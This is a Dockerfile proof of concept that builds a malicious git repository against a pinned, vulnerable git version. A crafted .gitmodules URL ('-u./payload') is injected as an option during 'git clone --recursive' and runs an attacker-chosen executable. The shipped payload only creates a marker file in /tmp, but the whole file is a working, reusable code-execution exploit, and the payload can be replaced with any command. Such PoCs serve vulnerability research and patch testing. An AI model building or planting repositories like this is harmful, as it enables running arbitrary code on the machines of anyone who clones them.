# To test it, run the container and do
# git clone --recursive /root/poc /tmp/newrepo
FROM debian:stretch

ENV PAYLOAD "touch /tmp/havebeenpwned"

RUN echo 'deb http://snapshot.debian.org/archive/debian/20180603T165432Z/ stretch main' > /etc/apt/sources.list

RUN apt-get -qq -o 'Acquire::Check-Valid-Until=false' update
RUN apt-get -qq -y --force-yes install git perl-base=5.24.1-3+deb9u2

RUN git init /root/poc
WORKDIR /root/poc
RUN echo "$PAYLOAD" > payload \
	&& git config --global user.name "root" \
	&& git config --global user.email "root@localshot" \
	&& git add payload \
	&& git update-index --add --chmod=+x payload \
	&& git init x:x \
	&& cd x:x \
	&& touch a \
	&& git add a \
	&& git commit -m "a" \
	&& cd .. \
	&& git commit -m "x:x" \
	&& git submodule add './replace' 'x:x' \
	&& sed 's,url = ./replace,url = -u./payload,g' -i .gitmodules \
	&& git add .gitmodules \
	&& git commit -m "payload"

WORKDIR /root
